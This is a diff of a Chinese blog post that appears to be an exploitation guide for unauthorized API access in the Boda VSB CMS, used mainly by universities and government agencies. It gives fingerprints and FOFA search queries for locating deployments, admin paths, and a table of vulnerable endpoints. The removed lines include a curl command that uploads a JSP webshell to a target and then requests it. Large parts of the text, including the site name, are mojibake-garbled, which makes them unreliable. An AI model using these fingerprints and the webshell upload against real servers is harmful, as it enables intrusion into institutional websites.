@@ -22,19 +22,18 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="鍗氳揪CMS API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡 CMS鍚嶇О锛氬崥杈惧叏濯掍綋缃戠珯缇ょ鐞嗗钩鍙帮紙Visual SiteBuilder &#x2F; VSB锛?寮€鍙戝晢锛氳タ瀹夊崥杈捐蒋浠惰偂浠芥湁闄愬叕鍙革紙鎴愮珛浜?000骞达級鎶€鏈爤锛欽ava + Tomcat + PostgreSQL&#x2F;Oracle&#x2F;MySQL閮ㄧ讲鏋舵瀯锛氱珯缇ょ鐞嗘ā寮忥紙">
+  <meta name="description" content="CMS名称：博达全媒体网站群管理平台（Visual SiteBuilder &#x2F; VSB）开发商：西安博达软件股份有限公司（成立于2000年）技术栈：Java + Tomcat + PostgreSQL&#x2F;Oracle&#x2F;MySQL部署架构：站群管理模式（1台管理服务器 + N台发布服务器）客户群体：高校（70%+）、政府机构、科研院所文档日期：2026-07-08">
 <meta property="og:type" content="article">
-<meta property="og:title" content="博达CMS API未授权访问分析">
+<meta property="og:title" content="博达 CMS API 未授权访问分析">
 <meta property="og:url" content="http://example.com/2026/07/09/%E5%8D%9A%E8%BE%BECMS%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/index.html">
-<meta property="og:site_name" content="xiokuの小さな世界">
-<meta property="og:description" content="鍗氳揪CMS API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡 CMS鍚嶇О锛氬崥杈惧叏濯掍綋缃戠珯缇ょ鐞嗗钩鍙帮紙Visual SiteBuilder &#x2F; VSB锛?寮€鍙戝晢锛氳タ瀹夊崥杈捐蒋浠惰偂浠芥湁闄愬叕鍙革紙鎴愮珛浜?000骞达級鎶€鏈爤锛欽ava + Tomcat + PostgreSQL&#x2F;Oracle&#x2F;MySQL閮ㄧ讲鏋舵瀯锛氱珯缇ょ鐞嗘ā寮忥紙">
+<meta property="og:site_name" content="xioku銇皬銇曘仾涓栫晫">
+<meta property="og:description" content="CMS名称：博达全媒体网站群管理平台（Visual SiteBuilder &#x2F; VSB）开发商：西安博达软件股份有限公司（成立于2000年）技术栈：Java + Tomcat + PostgreSQL&#x2F;Oracle&#x2F;MySQL部署架构：站群管理模式（1台管理服务器 + N台发布服务器）客户群体：高校（70%+）、政府机构、科研院所文档日期：2026-07-08">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2026-07-09T08:07:15.000Z">
-<meta property="article:modified_time" content="2026-07-09T08:07:16.056Z">
+<meta property="article:published_time" content="2026-07-09T02:20:00.000Z">
+<meta property="article:modified_time" content="2026-07-09T08:30:59.618Z">
 <meta property="article:author" content="Xioku">
 <meta property="article:tag" content="API">
 <meta property="article:tag" content="未授权">
-<meta property="article:tag" content="漏洞">
 <meta property="article:tag" content="CMS">
 <meta name="twitter:card" content="summary">
 
@@ -51,7 +50,7 @@
   };
 </script>
 
-  <title>博达CMS API未授权访问分析 | xiokuの小さな世界</title>
+  <title>博达 CMS API 未授权访问分析 | xioku銇皬銇曘仾涓栫晫</title>
   
 
 
@@ -102,10 +101,10 @@
 
     <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">xiokuの小さな世界</h1>
+      <h1 class="site-title">xioku銇皬銇曘仾涓栫晫</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">xioku的小破站</p>
+      <p class="site-subtitle" itemprop="description">xioku鐨勫皬鐮寸珯</p>
   </div>
 
   <div class="site-nav-right">
@@ -210,11 +209,11 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xiokuの小さな世界">
+      <meta itemprop="name" content="xioku銇皬銇曘仾涓栫晫">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          博达CMS API未授权访问分析
+          博达 CMS API 未授权访问分析
         </h1>
 
         <div class="post-meta">
@@ -225,7 +224,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2026-07-09 16:07:15 / Modified: 16:07:16" itemprop="dateCreated datePublished" datetime="2026-07-09T16:07:15+08:00">2026-07-09</time>
+              <time title="Created: 2026-07-09 10:20:00 / Modified: 16:30:59" itemprop="dateCreated datePublished" datetime="2026-07-09T10:20:00+08:00">2026-07-09</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -255,305 +254,485 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="鍗氳揪CMS-API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡"><a href="#鍗氳揪CMS-API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡" class="headerlink" title="鍗氳揪CMS API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡"></a>鍗氳揪CMS API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡</h1><blockquote>
-<p><strong>CMS鍚嶇О</strong>锛氬崥杈惧叏濯掍綋缃戠珯缇ょ鐞嗗钩鍙帮紙Visual SiteBuilder &#x2F; VSB锛?<br><strong>寮€鍙戝晢</strong>锛氳タ瀹夊崥杈捐蒋浠惰偂浠芥湁闄愬叕鍙革紙鎴愮珛浜?000骞达級<br><strong>鎶€鏈爤</strong>锛欽ava + Tomcat + PostgreSQL&#x2F;Oracle&#x2F;MySQL<br><strong>閮ㄧ讲鏋舵瀯</strong>锛氱珯缇ょ鐞嗘ā寮忥紙1鍙扮鐞嗘湇鍔″櫒 + N鍙板彂甯冩湇鍔″櫒锛?<br><strong>瀹㈡埛缇や綋</strong>锛氶珮鏍★紙70%+锛夈€佹斂搴滄満鏋勩€佺鐮旈櫌鎵€<br><strong>鏂囨。鏃ユ湡</strong>锛?026-07-08</p>
+        <blockquote>
+<p><strong>CMS名称</strong>：博达全媒体网站群管理平台（Visual SiteBuilder &#x2F; VSB）<br><strong>开发商</strong>：西安博达软件股份有限公司（成立于2000年）<br><strong>技术栈</strong>：Java + Tomcat + PostgreSQL&#x2F;Oracle&#x2F;MySQL<br><strong>部署架构</strong>：站群管理模式（1台管理服务器 + N台发布服务器）<br><strong>客户群体</strong>：高校（70%+）、政府机构、科研院所<br><strong>文档日期</strong>：2026-07-08</p>
 </blockquote>
 <hr>
-<h2 id="鐩綍"><a href="#鐩綍" class="headerlink" title="鐩綍"></a>鐩綍</h2><ol>
-<li>[浜у搧鑳屾櫙涓庣壒寰佽瘑鍒玗(#涓€浜у搧鑳屾櫙涓庣壒寰佽瘑鍒?</li>
-<li><a href="#%E6%B5%9C%E5%AE%8Epi%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%A9%E7%B4%A1%E5%A8%B2%E7%82%B2%E5%8F%8F%E9%8F%85%EE%88%9A%E6%B5%98">API鏈巿鏉冩紡娲炲叏鏅浘</a></li>
-<li>[楂樺嵄婕忔礊锛圥0-P1锛塢(#涓夐珮鍗辨紡娲瀙0-p1)<ul>
-<li>3.1 浠绘剰鏂囦欢涓婁紶 鈫?Getshell</li>
-<li>3.2 妯℃澘娉ㄥ叆 &#x2F; SSTI 鈫?RCE</li>
-<li>3.3 鍙嶅簭鍒楀寲 鈫?RCE</li>
-<li>3.4 浠绘剰鍛戒护鎵ц</li>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
+<li><a href="#%E4%B8%80%E4%BA%A7%E5%93%81%E8%83%8C%E6%99%AF%E4%B8%8E%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB">产品背景与特征识别</a></li>
+<li><a href="#%E4%BA%8Capi%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%85%A8%E6%99%AF%E5%9B%BE">API未授权漏洞全景图</a></li>
+<li><a href="#%E4%B8%89%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9Ep0-p1">高危漏洞（P0-P1）</a><ul>
+<li>3.1 任意文件上传 → Getshell</li>
+<li>3.2 模板注入 &#x2F; SSTI → RCE</li>
+<li>3.3 反序列化 → RCE</li>
+<li>3.4 任意命令执行</li>
 </ul>
 </li>
-<li>[涓珮鍗辨紡娲烇紙P1-P2锛塢(#鍥涗腑楂樺嵄婕忔礊p1-p2)<ul>
-<li>4.1 鏁忔劅淇℃伅娉勯湶</li>
-<li>4.2 姘村钩瓒婃潈锛圛DOR锛?   - 4.3 鍨傜洿瓒婃潈 &#x2F; 浠绘剰鐢ㄦ埛娣诲姞</li>
-<li>4.4 浠绘剰瀵嗙爜閲嶇疆</li>
-<li>4.5 SQL 娉ㄥ叆</li>
-<li>4.6 Druid 鐩戞帶鏈巿鏉?   - 4.7 Swagger API 鏂囨。娉勯湶</li>
+<li><a href="#%E5%9B%9B%E4%B8%AD%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9Ep1-p2">中高危漏洞（P1-P2）</a><ul>
+<li>4.1 敏感信息泄露</li>
+<li>4.2 水平越权（IDOR）</li>
+<li>4.3 垂直越权 &#x2F; 任意用户添加</li>
+<li>4.4 任意密码重置</li>
+<li>4.5 SQL 注入</li>
+<li>4.6 Druid 监控未授权</li>
+<li>4.7 Swagger API 文档泄露</li>
 </ul>
 </li>
-<li>[涓嵄婕忔礊锛圥2-P3锛塢(#浜斾腑鍗辨紡娲瀙2-p3)<ul>
+<li><a href="#%E4%BA%94%E4%B8%AD%E5%8D%B1%E6%BC%8F%E6%B4%9Ep2-p3">中危漏洞（P2-P3）</a><ul>
 <li>4.1 SSRF</li>
-<li>4.2 鐩綍閬嶅巻 &#x2F; 浠绘剰鏂囦欢璇诲彇</li>
-<li>4.3 瀛樺偍鍨?XSS</li>
-<li>4.4 寮卞彛浠?&#x2F; 榛樿鍙ｄ护</li>
+<li>4.2 目录遍历 &#x2F; 任意文件读取</li>
+<li>4.3 存储型 XSS</li>
+<li>4.4 弱口令 &#x2F; 默认口令</li>
 </ul>
 </li>
-<li>[宸茬煡瀹樻柟瀹夊叏澹版槑](#鍏凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄?</li>
-<li><a href="#%E6%B6%93%E5%86%A8%E7%96%84%E9%8E%B4%E6%A8%BB%EE%97%85%E5%A8%B4?checklist">瀹炴垬妫€娴?Checklist</a></li>
-<li>[闃插尽寤鸿](#鍏槻寰″缓璁?</li>
+<li><a href="#%E5%85%AD%E5%B7%B2%E7%9F%A5%E5%AE%98%E6%96%B9%E5%AE%89%E5%85%A8%E5%A3%B0%E6%98%8E">已知官方安全声明</a></li>
+<li><a href="#%E4%B8%83%E5%AE%9E%E6%88%98%E6%A3%80%E6%B5%8B-checklist">实战检测 Checklist</a></li>
+<li><a href="#%E5%85%AB%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
 </ol>
 <hr>
-<h2 id="涓€銆佷骇鍝佽儗鏅笌鐗瑰緛璇嗗埆"><a href="#涓€銆佷骇鍝佽儗鏅笌鐗瑰緛璇嗗埆" class="headerlink" title="涓€銆佷骇鍝佽儗鏅笌鐗瑰緛璇嗗埆"></a>涓€銆佷骇鍝佽儗鏅笌鐗瑰緛璇嗗埆</h2><h3 id="1-1-浜у搧姒傝堪"><a href="#1-1-浜у搧姒傝堪" class="headerlink" title="1.1 浜у搧姒傝堪"></a>1.1 浜у搧姒傝堪</h3><p>鍗氳揪鍏ㄥ獟浣撶綉绔欑兢绠＄悊骞冲彴锛圴SB锛夋槸鍥藉唴楂樻牎甯傚満鍗犳湁鐜囨渶楂樼殑绔欑兢绠＄悊绯荤粺銆傜郴缁熼噰鐢?*Java鎶€鏈爤**锛堟湭浣跨敤Struts2妗嗘灦锛夛紝鍚庣甯歌浜?Tomcat 瀹瑰櫒锛屾暟鎹簱澶氶噰鐢?PostgreSQL锛堥粯璁わ級鎴?Oracle&#x2F;MySQL銆?<br><strong>鍏稿瀷閮ㄧ讲璺緞</strong>锛?- Linux锛歚&#x2F;opt&#x2F;vsb9&#x2F;<code> 鎴?</code>&#x2F;opt&#x2F;vsb&#x2F;&#96;</p>
+<h2 id="一、产品背景与特征识别"><a href="#一、产品背景与特征识别" class="headerlink" title="一、产品背景与特征识别"></a>一、产品背景与特征识别</h2><h3 id="1-1-产品概述"><a href="#1-1-产品概述" class="headerlink" title="1.1 产品概述"></a>1.1 产品概述</h3><p>博达全媒体网站群管理平台（VSB）是国内高校市场占有率最高的站群管理系统。系统采用<strong>Java技术栈</strong>（未使用Struts2框架），后端常见于 Tomcat 容器，数据库多采用 PostgreSQL（默认）或 Oracle&#x2F;MySQL。</p>
+<p><strong>典型部署路径</strong>：</p>
 <ul>
-<li>Windows锛歚C:\Program Files\VSB`</li>
+<li>Linux：<code>/opt/vsb9/</code> 或 <code>/opt/vsb/</code></li>
+<li>Windows：<code>C:\Program Files\VSB\</code></li>
 </ul>
-<h3 id="1-2-鎸囩汗鐗瑰緛"><a href="#1-2-鎸囩汗鐗瑰緛" class="headerlink" title="1.2 鎸囩汗鐗瑰緛"></a>1.2 鎸囩汗鐗瑰緛</h3><h4 id="HTTP-鍝嶅簲澶寸壒寰"><a href="#HTTP-鍝嶅簲澶寸壒寰" class="headerlink" title="HTTP 鍝嶅簲澶寸壒寰?&#96;&#96;&#96;"></a>HTTP 鍝嶅簲澶寸壒寰?&#96;&#96;&#96;</h4><p>X-Powered-By: VSB<br>Server: Apache-Coyote&#x2F;1.1<br>Set-Cookie: JSESSIONID&#x3D;…</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 椤甸潰 / HTML 鐗瑰緛</span><br></pre></td></tr></table></figure>
-<p>Powered by 鍗氳揪缃戠珯缇?&#x2F;content&#x2F;common&#x2F;header.js<br>&#x2F;vsb&#x2F;<br>vsbclub<br>&#x2F;com.zving.* 锛堝弽缂栬瘧甯歌鍖呭悕锛?&#96;&#96;&#96;</p>
-<h4 id="榛樿绔彛"><a href="#榛樿绔彛" class="headerlink" title="榛樿绔彛"></a>榛樿绔彛</h4><table>
+<h3 id="1-2-指纹特征"><a href="#1-2-指纹特征" class="headerlink" title="1.2 指纹特征"></a>1.2 指纹特征</h3><h4 id="HTTP-响应头特征"><a href="#HTTP-响应头特征" class="headerlink" title="HTTP 响应头特征"></a>HTTP 响应头特征</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Powered-By: VSB</span><br><span class="line">Server: Apache-Coyote/1.1</span><br><span class="line">Set-Cookie: JSESSIONID=...</span><br></pre></td></tr></table></figure>
+
+<h4 id="页面-HTML-特征"><a href="#页面-HTML-特征" class="headerlink" title="页面 &#x2F; HTML 特征"></a>页面 &#x2F; HTML 特征</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Powered by 博达网站群</span><br><span class="line">/content/common/header.js</span><br><span class="line">/vsb/</span><br><span class="line">vsbclub</span><br><span class="line">/com.zving.* （反编译常见包名）</span><br></pre></td></tr></table></figure>
+
+<h4 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h4><table>
 <thead>
 <tr>
-<th align="left">绔彛</th>
-<th align="left">鐢ㄩ€?</th>
+<th align="left">端口</th>
+<th align="left">用途</th>
 </tr>
 </thead>
 <tbody><tr>
 <td align="left">80&#x2F;443</td>
-<td align="left">鍓嶅彴闂ㄦ埛绔欑偣</td>
+<td align="left">前台门户站点</td>
 </tr>
 <tr>
 <td align="left">8080</td>
-<td align="left">Tomcat 绠＄悊锛堥儴鍒嗛儴缃诧級</td>
+<td align="left">Tomcat 管理（部分部署）</td>
 </tr>
 <tr>
 <td align="left">8443</td>
-<td align="left">HTTPS 绠＄悊鍚庡彴</td>
+<td align="left">HTTPS 管理后台</td>
 </tr>
 </tbody></table>
-<h4 id="甯歌鍚庡彴璺緞"><a href="#甯歌鍚庡彴璺緞" class="headerlink" title="甯歌鍚庡彴璺緞"></a>甯歌鍚庡彴璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/vsb/admin/           鈫?绠＄悊鍚庡彴鐧诲綍</span><br><span class="line">/siteadmin/           鈫?绔欑偣绠＄悊</span><br><span class="line">/vsb/manager/         鈫?绯荤粺绠＄悊</span><br><span class="line">/vsb/console/         鈫?鎺у埗鍙?```</span><br><span class="line"></span><br><span class="line">#### FOFA / 鎼滅储寮曟搸鎸囩汗</span><br></pre></td></tr></table></figure>
-<p>app&#x3D;”鍗氳揪鍏ㄥ獟浣撶綉绔欑兢绠＄悊骞冲彴”<br>body&#x3D;”vsbclub”<br>body&#x3D;”鍗氳揪缃戠珯缇?<br>icon_hash&#x3D;”-886587282”   鈫?甯歌鍒ゆ柇</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 1.3 API 璺緞瑙勫緥</span><br><span class="line"></span><br><span class="line">鍗氳揪绔欑兢绯荤粺鐨?API 閫氬父閬靛惊浠ヤ笅璺緞妯″紡锛堥€氳繃 JS 鍙嶇紪璇戞垨娴侀噺鎶撳彇鑾峰緱锛夛細</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>&#x2F;api&#x2F;xxx                  鈫?RESTful API<br>&#x2F;vsb&#x2F;api&#x2F;xxx              鈫?VSB 鍐呴儴 API<br>&#x2F;cms&#x2F;api&#x2F;xxx              鈫?CMS 鍐呭 API<br>&#x2F;pub&#x2F;api&#x2F;xxx              鈫?鍏紑 API<br>&#x2F;services&#x2F;xxx             鈫?WebService 鎺ュ彛</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 浜屻€丄PI鏈巿鏉冩紡娲炲叏鏅浘</span><br><span class="line"></span><br><span class="line">鍗氳揪 CMS 浣滀负**鍟嗕笟闂簮绯荤粺**锛屽叾 API 閴存潈瀹屽叏渚濊禆寮€鍙戣€呯殑鑷疄鐜般€傜敱浜庣珯缇ゆ灦鏋勬秹鍙婂ぇ閲忓唴閮?API 鎺ュ彛锛岀粡甯稿瓨鍦ㄩ壌鏉冮仐婕忛棶棰樸€?</span><br><span class="line">| 婕忔礊绫诲瀷 | 椋庨櫓绛夌骇 | 鏀诲嚮澶嶆潅搴?| 鍗卞 | 鍏稿瀷 API 璺緞 |</span><br><span class="line">|:---------|:--------:|:----------:|:----|:-------------|</span><br><span class="line">| 浠绘剰鏂囦欢涓婁紶 鈫?Getshell | 猸愨瓙猸愨瓙猸?| 浣?| 鏈嶅姟鍣ㄦ拨闄?| `/api/upload` `/vsb/uploadFile` |</span><br><span class="line">| 妯℃澘娉ㄥ叆 鈫?RCE | 猸愨瓙猸愨瓙猸?| 涓?| 鏈嶅姟鍣ㄦ拨闄?| `/api/template/save` `/vsb/template` |</span><br><span class="line">| 鍙嶅簭鍒楀寲 RCE | 猸愨瓙猸愨瓙猸?| 涓珮 | 鏈嶅姟鍣ㄦ拨闄?| Java RMI/Hessian 绔偣 |</span><br><span class="line">| 鏁忔劅淇℃伅娉勯湶 | 猸愨瓙猸愨瓙 | 鏋佷綆 | 鏁版嵁搴?Bucket 鍑嵁娉勯湶 | `/api/config` `/api/db` |</span><br><span class="line">| 姘村钩瓒婃潈 (IDOR) | 猸愨瓙猸愨瓙 | 浣?| 璺ㄧ珯绡℃敼/鏁版嵁绐冨彇 | `/api/article/edit?id=` |</span><br><span class="line">| 鍨傜洿瓒婃潈 | 猸愨瓙猸愨瓙 | 浣?| 鏉冮檺鎻愬崌鑷崇鐞嗗憳 | `/api/user/add?role=admin` |</span><br><span class="line">| 浠绘剰瀵嗙爜閲嶇疆 | 猸愨瓙猸愨瓙 | 浣?| 鎺ョ绠＄悊鍛樿处鍙?| `/api/user/resetPwd` |</span><br><span class="line">| SQL 娉ㄥ叆 | 猸愨瓙猸愨瓙 | 涓?| 鎷栧簱/鍚庡彴鐧诲綍缁曡繃 | `/api/site/list?siteId=` |</span><br><span class="line">| SSRF | 猸愨瓙猸?| 浣?| 鍐呯綉鎺㈡祴 | `/api/import?url=` |</span><br><span class="line">| 鐩綍閬嶅巻 | 猸愨瓙猸?| 浣?| 婧愮爜娉勯湶 | `/api/download?file=` |</span><br><span class="line">| Druid 鐩戞帶娉勯湶 | 猸愨瓙猸?| 鏋佷綆 | SQL 鐩戞帶 + Session | `/druid/index.html` |</span><br><span class="line">| Swagger 鏂囨。娉勯湶 | 猸愨瓙猸?| 鏋佷綆 | 鍏ㄩ噺 API 娉勯湶 | `/swagger-ui.html` |</span><br><span class="line">| XSS (瀛樺偍鍨? | 猸愨瓙猸?| 浣?| 閽撻奔/绠＄悊鍛樺姭鎸?| `/api/comment/add` |</span><br><span class="line">| 寮卞彛浠?/ 榛樿瀵嗙爜 | 猸愨瓙猸?| 鏋佷綆 | 鐩存帴鐧诲綍鍚庡彴 | `/vsb/admin/` |</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 涓夈€侀珮鍗辨紡娲烇紙P0-P1锛?</span><br><span class="line">### 3.1 浠绘剰鏂囦欢涓婁紶 鈫?Getshell</span><br><span class="line"></span><br><span class="line">**椋庨櫓**锛氣瓙 鏈€楂樺嵄 鈥?鍙洿鎺ヨ幏鍙栨湇鍔″櫒鏉冮檺</span><br><span class="line"></span><br><span class="line">鍗氳揪绔欑兢绯荤粺鐨?*妯℃澘绠＄悊銆侀檮浠朵笂浼犮€佺珯鐐瑰浠芥仮澶?*绛夊姛鑳芥ā鍧楋紝濡傛灉 API 鏈壌鏉冿紝鏀诲嚮鑰呭彲浠ョ洿鎺ヤ笂浼?JSP/WAR 鏂囦欢鑷冲彲瑙ｆ瀽鐩綍銆?</span><br><span class="line">#### 妫€娴嬪叆鍙?</span><br></pre></td></tr></table></figure>
-<h1 id="甯歌涓婁紶绔偣锛堥渶瀹為檯鎶撳彇鎴-JS-鍙嶇紪璇戠‘璁わ級"><a href="#甯歌涓婁紶绔偣锛堥渶瀹為檯鎶撳彇鎴-JS-鍙嶇紪璇戠‘璁わ級" class="headerlink" title="甯歌涓婁紶绔偣锛堥渶瀹為檯鎶撳彇鎴?JS 鍙嶇紪璇戠‘璁わ級"></a>甯歌涓婁紶绔偣锛堥渶瀹為檯鎶撳彇鎴?JS 鍙嶇紪璇戠‘璁わ級</h1><p>POST &#x2F;api&#x2F;upload<br>POST &#x2F;api&#x2F;file&#x2F;upload<br>POST &#x2F;vsb&#x2F;uploadFile<br>POST &#x2F;cms&#x2F;api&#x2F;upload<br>POST &#x2F;siteadmin&#x2F;upload<br>POST &#x2F;vsb&#x2F;template&#x2F;upload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 娴嬭瘯 PoC</span><br><span class="line"></span><br><span class="line">**curl 娴嬭瘯锛圵indows PowerShell 鍏煎锛夛細**</span><br><span class="line"></span><br><span class="line">```powershell</span><br><span class="line"># 1. 灏濊瘯涓婁紶 JSP 鏈ㄩ┈</span><br><span class="line">curl -X POST &quot;http://target.com/api/upload&quot; `</span><br><span class="line">  -F &quot;file=@shell.jsp&quot; `</span><br><span class="line">  -F &quot;dir=upload&quot;</span><br><span class="line"></span><br><span class="line"># 2. 杩斿洖璺緞濡?/upload/202607/shell.jsp</span><br><span class="line"># 3. 璁块棶纭</span><br><span class="line">curl &quot;http://target.com/upload/202607/shell.jsp&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="常见后台路径"><a href="#常见后台路径" class="headerlink" title="常见后台路径"></a>常见后台路径</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/vsb/admin/           → 管理后台登录</span><br><span class="line">/siteadmin/           → 站点管理</span><br><span class="line">/vsb/manager/         → 系统管理</span><br><span class="line">/vsb/console/         → 控制台</span><br></pre></td></tr></table></figure>
 
-<p><strong>JSP 椹唴瀹圭ず渚嬶細</strong></p>
+<h4 id="FOFA-搜索引擎指纹"><a href="#FOFA-搜索引擎指纹" class="headerlink" title="FOFA &#x2F; 搜索引擎指纹"></a>FOFA &#x2F; 搜索引擎指纹</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;博达全媒体网站群管理平台&quot;</span><br><span class="line">body=&quot;vsbclub&quot;</span><br><span class="line">body=&quot;博达网站群&quot;</span><br><span class="line">icon_hash=&quot;-886587282&quot;   ← 常见判断</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-API-路径规律"><a href="#1-3-API-路径规律" class="headerlink" title="1.3 API 路径规律"></a>1.3 API 路径规律</h3><p>博达站群系统的 API 通常遵循以下路径模式（通过 JS 反编译或流量抓取获得）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/api/xxx                  → RESTful API</span><br><span class="line">/vsb/api/xxx              → VSB 内部 API</span><br><span class="line">/cms/api/xxx              → CMS 内容 API</span><br><span class="line">/pub/api/xxx              → 公开 API</span><br><span class="line">/services/xxx             → WebService 接口</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、API未授权漏洞全景图"><a href="#二、API未授权漏洞全景图" class="headerlink" title="二、API未授权漏洞全景图"></a>二、API未授权漏洞全景图</h2><p>博达 CMS 作为<strong>商业闭源系统</strong>，其 API 鉴权完全依赖开发者的自实现。由于站群架构涉及大量内部 API 接口，经常存在鉴权遗漏问题。</p>
+<table>
+<thead>
+<tr>
+<th align="left">漏洞类型</th>
+<th align="center">风险等级</th>
+<th align="center">攻击复杂度</th>
+<th align="left">危害</th>
+<th align="left">典型 API 路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">任意文件上传 → Getshell</td>
+<td align="center">⭐⭐⭐⭐⭐</td>
+<td align="center">低</td>
+<td align="left">服务器沦陷</td>
+<td align="left"><code>/api/upload</code> <code>/vsb/uploadFile</code></td>
+</tr>
+<tr>
+<td align="left">模板注入 → RCE</td>
+<td align="center">⭐⭐⭐⭐⭐</td>
+<td align="center">中</td>
+<td align="left">服务器沦陷</td>
+<td align="left"><code>/api/template/save</code> <code>/vsb/template</code></td>
+</tr>
+<tr>
+<td align="left">反序列化 RCE</td>
+<td align="center">⭐⭐⭐⭐⭐</td>
+<td align="center">中高</td>
+<td align="left">服务器沦陷</td>
+<td align="left">Java RMI&#x2F;Hessian 端点</td>
+</tr>
+<tr>
+<td align="left">敏感信息泄露</td>
+<td align="center">⭐⭐⭐⭐</td>
+<td align="center">极低</td>
+<td align="left">数据库&#x2F;Bucket 凭据泄露</td>
+<td align="left"><code>/api/config</code> <code>/api/db</code></td>
+</tr>
+<tr>
+<td align="left">水平越权 (IDOR)</td>
+<td align="center">⭐⭐⭐⭐</td>
+<td align="center">低</td>
